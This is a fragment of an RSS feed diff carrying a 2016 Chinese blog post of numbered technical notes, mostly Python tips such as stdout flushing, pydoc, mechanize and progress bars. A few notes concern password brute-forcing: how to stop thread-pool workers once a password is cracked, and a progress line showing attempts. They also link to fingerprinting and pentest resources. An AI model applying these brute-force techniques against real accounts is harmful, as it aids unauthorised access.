+                立即停止线程池中的工作线程(无论任务有没有完成),经测试并不能停止所有的线程池中要进行的任务,应该
+                是只能停止当前正在执行的一个函数过程(子线程)
+
+                为了停止线程池中的所有线程,尤其是在爆破密码时,某一个线程已经爆破成功,为了达到&quot;停止其他的将要执
+                行的通过map加入到pool线程池中的任务&quot;相同的效果,在每个线程中的开头判断是否已经爆破成功,成功则直
+                接return,不成功则继续本线程应该完成的工作
+            pool.join()
+                等待线程池中的工作线程退出,必须先使用pool.close()或者pool.terminate()才能调用join()
+
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;182.&lt;/span&gt;cms在线识别
+    http://whatweb.bugscaner.com/
+&lt;span class=&quot;p&quot;&gt;183.&lt;/span&gt;Netifera(域分析神器)
+&lt;span class=&quot;p&quot;&gt;184.&lt;/span&gt;渗透图
+    http://images0.cnblogs.com/blog2015/640760/201506/121255389739630.png
+    http://www.e-wolf.top/content/uploadfile/201608/0f9f1471011328.jpg
+&lt;span class=&quot;p&quot;&gt;185.&lt;/span&gt;python函数嵌套时在内层函数中操作外层函数的变量,不使用全局变量的方法
+    http://www.crifan.com/python_access_parent_nesting_function_local_variable_from_nested_function/
+&lt;span class=&quot;p&quot;&gt;186.&lt;/span&gt;python使用mechanize进行web交互(可列表单,填表单,提交表单,使用代理等很方便)
+    http://blog.csdn.net/jeanphorn/article/details/46917159
+    http://blog.chinaunix.net/uid-26722078-id-3507409.html
+&lt;span class=&quot;p&quot;&gt;187.&lt;/span&gt;python显示进度条方法
+    http://www.111cn.net/phper/python/66812.htm
+&lt;span class=&quot;p&quot;&gt;188.&lt;/span&gt;python中https访问认证失败解决方法:
+    http://bookshadow.com/weblog/2015/04/22/sae-python-weibo-sdk-certificate-verify-failed/
+&lt;span class=&quot;p&quot;&gt;189.&lt;/span&gt;python中sys.stdout模块
+    http://www.cnblogs.com/turtle-fly/p/3280519.html
+    a. print &quot;something&quot;   相当于sys.stdout.write(&quot;something&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&quot;)
+    b. print &quot;something&quot;,  相当于sys.stdout.write(&quot;something&quot;)&lt;span class=&quot;sb&quot;&gt;
+
+    没有换行的print或sys.stdout.write()都不会立即打印出来,需要遇到有换行的地方才会显示,或者没有遇到换行只能在
+    程序运行结束后强制显示,也即b中的方法不会打印出内容到终端,加sys.stdout.flush()才可以马上显示,或者遇到下面的
+    print有换行功能,或者程序结束才会打印出来
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;190.&lt;/span&gt;查看python模块文档
+        python -m pydoc -p 500
+    python官方文档中文站
+        http://python.usyiyi.cn/translate/python_278/library/index.html
+    python官方英文文档
+        https://docs.python.org/2.7/&lt;span class=&quot;sb&quot;&gt;
+
+    上面不能查看到的信息,eg. sys.stdout有哪些函数?方法如下:
+        python
+        import sys
+        dir(sys.stdout)
+        sys.stdout.__doc__
+            可以看出sys.stdout是个文件对象
+            文件对象的操作http://my.oschina.net/u/2252538/blog/332757
+        sys.stdout.truncate.__doc__
+        sys.stdout.close.__doc__
+        ...
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;191.&lt;/span&gt;快速查看windows是32|64位
+    dxdiag
+&lt;span class=&quot;p&quot;&gt;192.&lt;/span&gt;python在一行打印的方法
+    eg.
+    PASSWORD=password+(50-len(password))&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&quot; &quot;
+    sys.stdout.write(&#39;-&#39;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;(try_time&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/(sum&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/100))+&#39;&amp;gt;&#39;+str(try_time&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/(sum&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;/100))+&#39;%&#39;+&#39; %s/%s %s&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&#39; % (try_time&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,sum&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,PASSWORD))
+    sys.stdout.flush()
+    其中password长度是变化的,使用print &quot;&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&quot;或sys.stdout.write(&quot;&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&quot;)想达到退格的效果无果后,考虑到的技巧:声明好
+    一个尾部是空格串的PASSWORD,将动态变化的password放入PASSWORD的最前面,这样就是每次在同一行打印长度不变的字符串了,就不会由于password由长变短后突出的长的尾巴不能用退格清除而烦恼了
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Sun, 07 Aug 2016 00:00:00 +0800</pubDate>
+        <link>/auxilary/2016/08/07/my-notes/</link>
+        <guid isPermaLink="true">/auxilary/2016/08/07/my-notes/</guid>
+        
+        <category>experience</category>
+        
+        <category>study</category>
+        
+        
+        <category>auxilary</category>
         
       </item>
     
